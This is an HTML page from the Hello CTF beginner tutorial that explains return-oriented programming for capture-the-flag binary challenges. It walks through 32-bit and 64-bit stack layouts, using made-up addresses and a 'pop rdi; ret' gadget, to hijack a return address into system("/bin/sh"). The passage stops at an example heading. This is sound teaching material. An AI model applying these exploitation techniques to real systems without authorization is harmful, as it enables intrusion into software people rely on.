@@ -1,0 +1,1326 @@
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+    <title>ROP入门 | Hello CTF</title>
+  
+  <meta name="description" content="开源免费、新手友好的CTF(Capture The Flag,夺旗赛)入门教程">
+  <link rel="icon" href="../../assets/images/favicon.png">
+
+  <!-- 字体（与首页同源） -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Noto+Sans+SC:wght@400;500;700;800&display=swap" rel="stylesheet">
+
+  <!-- material 文章排版 CSS（pin 9.7.7 的 hash 文件名，升级主题时同步更新） -->
+  <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+  <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+
+  <!-- Hello-CTF 外壳 -->
+  <link rel="stylesheet" href="../../shell/shell.css">
+  <link rel="stylesheet" href="../../shell/shell-docs.css">
+  <link rel="stylesheet" href="../../shell/shell-article.css">
+
+  <!-- 站点原有 extra_css（katex CDN / extra.css / bannerSlider.css 等） -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+  
+    <link rel="stylesheet" href="../../stylesheets/extra.css">
+  
+
+  <!-- admonition 等组件的图标 SVG 变量（原由 material base.html 注入） -->
+  
+
+
+
+  
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-V9998CDNR1"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-V9998CDNR1",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-V9998CDNR1",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+</head>
+<body data-md-color-scheme="default">
+
+  <!-- 主题初始化（先于渲染，避免闪烁）：hc-theme → shell data-theme + material slate -->
+  <script>
+    (function () {
+      var t = null;
+      try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+      if (t) {
+        document.documentElement.dataset.theme = t;
+        document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+      }
+    })();
+    window.__md_palette_sync = function (t) {
+      document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+    };
+  </script>
+
+  <script src="../../shell/search.js"></script>
+  <script src="../../shell/shell.js"></script>
+  <script>Shell.mount({ active: "" });</script>
+
+  <!-- 主区：顶部文档导航 + 文章 + TOC -->
+  <div class="main">
+    <nav class="hc-topnav" aria-label="文档导航">
+      <div class="hc-topnav-inner">
+        
+          
+          
+            <a class="tn-item tn-single" href="../../hc-start/"><svg class="ic tn-ico"><use href="#i-book"/></svg>快速开始</a>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-book"/></svg>前言<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-preface/">前言</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/about/">关于本书</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/usage/">食用方法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/join/">加入我们</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-wrench"/></svg>环境<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-env/">环境配置</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-env/CTFtool/">工具一览</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-env/Docker_On_Linux/">Docker环境</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-env/Crypto/">Crypto环境设置</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-puzzle"/></svg>MISC<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-misc/">MISC | 杂项</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/osint/">信息收集</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/Encode_extra/">编码扩展</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file/">文件基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/Archivefile/">压缩包</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/stego/">图片隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_stego/">文件隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/audio_stego/">音频隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/pcap/">流量分析</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/industrial/">工控类</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/memory/">内存取证</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_sign/">附:文件签名表</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-globe"/></svg>Web<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-web/">Web | 网络攻防</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/web_start/">Web入门题单</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/sensitive_info/">敏感信息泄露</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/php_basic/">PHP基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/php_unser_base/">PHP反序列化基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/sql_injection/">SQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/xss/">XSS攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/include/">文件包含</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/ssti/">SSTI注入</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/xxe/">XXE注入</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/ssrf/">SSRF注入</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/php_code_audit/">PHP 代码审计</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/rce/">RCE</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/file_upload/">文件上传</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/dir_traversal/">目录穿越</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/logical_vuln/">逻辑漏洞</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/any_file_read/">任意文件读取</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-lock"/></svg>Crypto<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-crypto/">Crypto | 密码学</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Recap/">前情提要</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Encode/">编码基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Classicalcipher/">古典密码</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Moderncipher/">现代密码</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-cpu"/></svg>Reverse<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-reverse/">逆向工程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%95%E5%AF%BC%E7%AF%87%EF%BC%9A%E7%81%B5%E9%AD%82FAQ/">引导篇：灵魂FAQ</a>
+    
+  
+    
+      <div class="tn-group">编译与可执行文件</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/">C语言基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/">存储结构</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9A%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/">可执行文件</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">交互式反汇编工具IDA</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/StartWithIDA/">从零开始的IDA</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/">IDA动态调试</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">常见算法</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97/">基本运算</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%BC%96%E7%A0%81%E5%9F%BA%E7%A1%80/">编码基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%97%E8%8A%82%E6%B5%81%E7%AE%97%E6%B3%95/">字节流算法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/">分组密码</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/z3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3/">z3约束求解</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9AASM%E6%B1%87%E7%BC%96/">x86 汇编初步</a>
+    
+  
+    
+      <div class="tn-group">代码保护与对抗</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%8A%B1%E6%8C%87%E4%BB%A4/">花指令</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A3%B3/">加壳</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/VM/">VM</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/SMC/">SMC</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/">异常处理</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%A4%9A%E7%BA%BF%E7%A8%8B/">多线程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/">TLS回调函数</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%8F%8D%E8%B0%83%E8%AF%95/">反调试</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/">控制流平坦化</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/">符号执行</a>
+    
+  
+    
+      <div class="tn-group">语言与框架</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Python/">Python</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/NET/">.NET</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Rust/">Rust</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/JavaScript/">JavaScript</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Android/">Android平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%A7%A3%E9%A2%98%E6%8A%80%E5%B7%A7/">解题技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item on">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-terminal"/></svg>Pwn<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../">Pwn | 二进制安全</a>
+    
+  
+    
+      <a class="tn-link" href="../wsl2_environment/">wsl2下的环境配置</a>
+    
+  
+    
+      <a class="tn-link" href="../Asm_x86/">汇编语言(x86)</a>
+    
+  
+    
+      <a class="tn-link" href="../Stack_Overflow/">栈上数组越界&栈溢出</a>
+    
+  
+    
+      <a class="tn-link on" href="./">ROP入门</a>
+    
+  
+    
+      <a class="tn-link" href="../ROP_Tricks/">常见的ROP技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../rop_add_v1/">ROP进阶</a>
+    
+  
+    
+      <a class="tn-link" href="../Protections/">常见保护</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-shield"/></svg>AWD<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_about/">AWD介绍</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_platform/">AWD平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_web.exp/">【WEB】AWD技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_pwn.exp/">【PWN】AWD技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-bot"/></svg>AI<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-ai/">AI | 人工智能</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/What_is_AI/">初识AI</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/MLP/">你的第一个神经网络</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-link"/></svg>区块链<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <div class="tn-group">Move</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x00/">从0开始的签到题</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x01/">独特的所有权</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x02/">神奇的时钟</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x03/">对象与燃气</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x04/">多样的泛型</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-tag"/></svg>附录<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-appendix/how-to-ask/">提问的智慧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/CTFevent/">CTF赛事</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/NSSCTF_Usage/">NSSCTF平台使用</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/book/">推荐书单</a>
+    
+  
+</div>
+            </div>
+          
+        
+      </div>
+    </nav>
+    <div class="doc-layout">
+      <article class="md-typeset hc-article">
+        <!-- Tags -->
+
+
+<!-- Actions -->
+<!-- Actions -->
+
+
+  <!-- Edit button -->
+  
+
+  <!-- View button -->
+  
+
+
+<!-- Page content -->
+<div><p>前面我们已经知道了可以通过覆盖返回地址控制程序流，但是只能实现使程序执行到某一个地址继续执行，还不能实现复杂的逻辑。接下来，就一起来看看如何基于覆盖返回地址实现复杂逻辑。</p>
+<h2 id="rop">面向返回编程（ROP）<a class="headerlink" href="#rop" title="Permanent link">¶</a></h2>
+<h3 id="rop_1">ROP原理<a class="headerlink" href="#rop_1" title="Permanent link">¶</a></h3>
+<p>ROP的主要目的便是通过在合适的位置布置一连串的返回地址，从而实现相对复杂的逻辑。举个栗子，我们已经在 <a href="../Stack_Overflow/">Stack_Overflow</a> 中学习到了如何劫持返回地址，但是我们所做的只是一个跳转至“后门函数”，其距离可以真正劫持到恶意代码上还有很远的路要走，而ROP就是一种解决方案，其通过精心布局栈上的地址来完成复杂逻辑的跳转</p>
+<h4 id="32-rop">32位 ROP<a class="headerlink" href="#32-rop" title="Permanent link">¶</a></h4>
+<p>一切，先从32位的ROP开始，其实大部分教材都是从64位开始的，但是64位开始会给新手在参数传递的过程中带来一定的迷惑性，因此我们从32位开始，先让我们回到ret之前的操作，假设溢出处的汇编指令如下
+</p><div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="err">0</span><span class="nf">x400000</span><span class="w"> </span><span class="no">func</span><span class="p">:</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="err">0</span><span class="nf">x400000</span><span class="w">    </span><span class="no">mov</span><span class="w"> </span><span class="no">eax</span><span class="p">,</span><span class="w"> </span><span class="mi">0xdeadbeef</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="err">0</span><span class="nf">x400004</span><span class="w">    </span><span class="no">ret</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="err">0</span><span class="nf">x400005</span><span class="w"> </span><span class="no">main</span><span class="p">:</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="err">0</span><span class="nf">x400005</span><span class="w">    </span><span class="no">call</span><span class="w"> </span><span class="no">func</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="err">0</span><span class="nf">x400009</span><span class="w">    </span><span class="no">mov</span><span class="w"> </span><span class="no">eax</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="err">0</span><span class="nf">x40000b</span><span class="w">    </span><span class="no">ret</span>
+</code></pre></div>
+<p>并且我们的栈帧如下图所示：</p>
+<table>
+<thead>
+<tr>
+<th>地址</th>
+<th>值</th>
+<th>如果值为指针，其指向的地址</th>
+<th>RSP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x0000000c</td>
+<td>0x400005</td>
+<td>mov eax, 0</td>
+<td>&lt;-</td>
+</tr>
+<tr>
+<td>0x00000008</td>
+<td>0x00000000</td>
+<td>0x00000000</td>
+<td></td>
+</tr>
+<tr>
+<td>0x00000004</td>
+<td>0x00000000</td>
+<td>0x00000000</td>
+<td></td>
+</tr>
+<tr>
+<td>0x00000000</td>
+<td>0x00000000</td>
+<td>0x00000000</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>按照正常情况下，进行返回，如果劫持返回，我们其实已经知道，很简单，溢出修改<code>0x000000c</code> 处的值使得 <code>0x400005</code>变成我们想要的地址即可，但是其只能干最简单的事情，想要真正劫持程序需要的是什么？当然是getshell了，那么在二进制如何getshell？当然是 system("/bin/sh") 了！</p>
+<p>现在假设system的地址是<code>0xf7000000</code>，那么我们理所当然想要将 <code>0x400005</code> 修改为 <code>0xf7000000</code>，于是问题就出现了，<code>"/bin/sh"</code>从哪来？</p>
+<p>还是先假设，<code>"/bin/sh"</code>的地址是<code>0xdeadbeef</code></p>
+<p>那么我们就需要在ROP的时候将<code>0xdeadbeef</code>传递给<code>0xf7000000</code>，但是怎么传？？？一脸问号是吧，既然ROP很难理解，不妨我们回到最开始，来看看函数调用的过程中32位下是如何传递参数的</p>
+<p>考虑一个参数的函数<code>foo</code>，我们想要调用<code>foo(233)</code>，汇编应该是这样的
+</p><div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nf">push</span><span class="w"> </span><span class="mi">233</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="nf">call</span><span class="w"> </span><span class="no">foo</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="nf">nop</span>
+</code></pre></div>
+我们来看看这个过程中函数栈帧的变化
+<table>
+<thead>
+<tr>
+<th>地址</th>
+<th>值</th>
+<th>如果值为指针，其指向的地址</th>
+<th>RSP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x0000000c</td>
+<td>0</td>
+<td></td>
+<td>&lt;-</td>
+</tr>
+<tr>
+<td>0x00000008</td>
+<td>0</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>0x00000004</td>
+<td>0</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>0x00000000</td>
+<td>0</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>首先第一步 push 233，其实就是将233压入栈中</p>
+<table>
+<thead>
+<tr>
+<th>地址</th>
+<th>值</th>
+<th>如果值为指针，其指向的地址</th>
+<th>RSP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x0000000c</td>
+<td>0</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>0x00000008</td>
+<td>233</td>
+<td></td>
+<td>&lt;-</td>
+</tr>
+<tr>
+<td>0x00000004</td>
+<td>0</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>0x00000000</td>
+<td>0</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>第二步 call foo，其实就是将当前的返回地址压入栈中，然后跳转到foo函数</p>
+<table>
+<thead>
+<tr>
+<th>地址</th>
+<th>值</th>
+<th>如果值为指针，其指向的地址</th>
+<th>RSP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x0000000c</td>
+<td>0</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>0x00000008</td>
+<td>233</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>0x00000004</td>
+<td>call foo的下一条指令</td>
+<td>nop</td>
+<td>&lt;-</td>
+</tr>
+<tr>
+<td>0x00000000</td>
+<td>0</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>好，到此为止，大家思考一个问题，是不是当<code>foo</code>函数返回的时候（即ret指令执行的时候），RSP（ESP）应该也在这个位置，想明白了就继续往下看，没想明白就先想想</p>
+<p>现在这一瞬间，是<code>foo</code>开始执行的时候，RSP（ESP）指向返回地址，而它需要的参数位于RSP + 4的位置，是否意味着，如果我们通过ROP劫持返回地址到<code>foo</code>的时候，我们应该确保进入<code>foo</code>函数的瞬间 RSP + 4的位置应该是它的第一个参数？同时RSP为<code>foo</code>的返回地址</p>
+<p>最后，我们将<code>foo</code>函数看做是<code>system</code>函数，是不是意味着，如果我们想要通过ROP劫持返回地址到<code>system</code>的时候，我们应该确保进入<code>system</code>函数的瞬间 RSP + 4的位置应该是它的第一个参数？同时RSP为<code>system</code>的返回地址</p>
+<p>那么回到最开始，我们想要劫持返回地址到<code>system</code>，我们应该怎么做呢？
+我们只需要将栈给覆写成下面这样就好了</p>
+<table>
+<thead>
+<tr>
+<th>地址</th>
+<th>值</th>
+<th>如果值为指针，其指向的地址</th>
+<th>RSP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x00000014</td>
+<td>0xdeadbeef</td>
+<td>"/bin/sh"</td>
+<td></td>
+</tr>
+<tr>
+<td>0x00000010</td>
+<td>0x00000000</td>
+<td>空</td>
+<td></td>
+</tr>
+<tr>
+<td>0x0000000c</td>
+<td>0xf7000000</td>
+<td>system的开始</td>
+<td>&lt;-</td>
+</tr>
+<tr>
+<td>0x00000008</td>
+<td>0x00000000</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>0x00000004</td>
+<td>0x00000000</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>0x00000000</td>
+<td>0x00000000</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>这样，当存在漏洞的函数执行<code>ret</code>命令时，首先会因为<code>ret</code>返回到system，此时RSP指向了<code>0x00000010</code>其为system的返回值，但是因此我们已经进入了<code>system</code>函数，因此<code>system</code>要返回到哪里去与我们无关，我们getshell了就行了，不需要下一步了。而此时，RSP + 4为<code>"/bin/sh"</code>，其就理所当然地成为了<code>system</code>的第一个参数，从而getshell成功</p>
+<p>那么，以上的所有事情，前提都是我们知道<code>system</code>的地址和<code>"/bin/sh"</code>的地址，那么我们如何知道这两个地址呢？这就需要我们去寻找gadget了，这个在后文中我们再讨论，现在我们先讨论如果需要在ROP中按顺序调用多个函数的情况</p>
+<p>其实你也猜到了，我们之前劫持到<code>system</code>的时候还有个<code>system</code>的返回地址是留空的没有使用呢，其实只需要将这个留空改成下一个函数的地址就好了，这样就可以实现按顺序调用多个函数，至于传参，这是一个大坑，之后填</p>
+<h4 id="64-rop">64位 ROP<a class="headerlink" href="#64-rop" title="Permanent link">¶</a></h4>
+<p>64位的ROP在我看来，其实比32位的简单多了，因为64位的参数传递是通过寄存器传递的，我们只需要通过控制寄存器的值就可以实现参数传递，因此更多的是通过合适的手段将寄存器修改为我们想要传递的值</p>
+<p>先阐述一个事实，在没那么新的gcc中，程序都会被编译进一个 <code>_libc_init_csu</code>函数用于初始化，在这个函数中，有一个汇编片段如下</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nf">pop</span><span class="w"> </span><span class="no">r15</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nf">ret</span>
+</code></pre></div>
+<p>其中，<code>pop r15</code>占2字节，我们假设其起始地址为<code>0x8</code>，那么 <code>ret</code>的地址就是 <code>0xa</code>，那么问题来了，<code>0x9</code>这个地址，它是合法的吗？</p>
+<p>事实上确实是合法的，而且很有用，如果从 <code>0x9</code>开始看这个代码片段，由于地址错位的问题，代码片段会变成这样</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nf">pop</span><span class="w"> </span><span class="no">rdi</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nf">ret</span>
+</code></pre></div>
+<p>这个字节错位弄出来的代码片段，非常有用，因为其<code>pop rdi</code>这条指令，让我们有能力通过栈去修改寄存器了，而这个寄存器就是<code>rdi</code>，那么我们就可以通过栈去修改<code>rdi</code>的值，从而实现参数传递了</p>
+<p>这些有用的代码片段，我们一般就称为gadget</p>
+<p>来看看64位下怎么实现和32位一样的ROP吧，还是考虑返回到<code>system("/bin/sh")</code></p>
+<p>假设system的地址是<code>0x7f000000</code>，<code>"/bin/sh"</code>的地址是<code>0xdeadbeef</code></p>
+<p>现在覆盖栈如下</p>
+<table>
+<thead>
+<tr>
+<th>地址</th>
+<th>值</th>
+<th>如果值为指针，其指向的地址</th>
+<th>RSP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x00000018</td>
+<td>0x7f000000</td>
+<td>system的开始</td>
+<td></td>
+</tr>
+<tr>
+<td>0x00000010</td>
+<td>0xdeadbeef</td>
+<td>"/bin/sh"</td>
+<td></td>
+</tr>
+<tr>
+<td>0x00000008</td>
+<td>gadget</td>
+<td>pop rdi; ret</td>
+<td>&lt;-</td>
+</tr>
+</tbody>
+</table>
+<p>最后开始颅内模拟一下，首先，<code>ret</code>返回到<code>pop rdi</code>，此时RSP指向了<code>0x00000010</code>，而<code>pop rdi</code>会将<code>0xdeadbeef</code>赋给<code>rdi</code>，这个过程中，RSP指向了<code>0x00000018</code>, 然后<code>ret</code>返回到<code>system</code>，此时RSP指向了<code>0x00000020</code>，而<code>system</code>的第一个参数就是<code>rdi</code>，因此<code>system</code>的第一个参数就是<code>0xdeadbeef</code>，也就是 <code>"/bin/sh"</code>，从而getshell成功，至于<code>system</code>的返回地址，我们不需要管，因为我们已经getshell了，但是如果你想实现按顺序调用多个函数，那么你就需要将<code>0x00000020</code>改成下一个函数的地址，这样就可以实现按顺序调用多个函数，至于多个参数的传递，这又是一个大坑，之后填</p>
+<h4 id="_1">示例<a class="headerlink" href="#_1" title="Permanent link">¶</a></h4>
+<p>以下面这个程序为例，目标是先后执行<code>func1</code>-<code>func3</code></p>
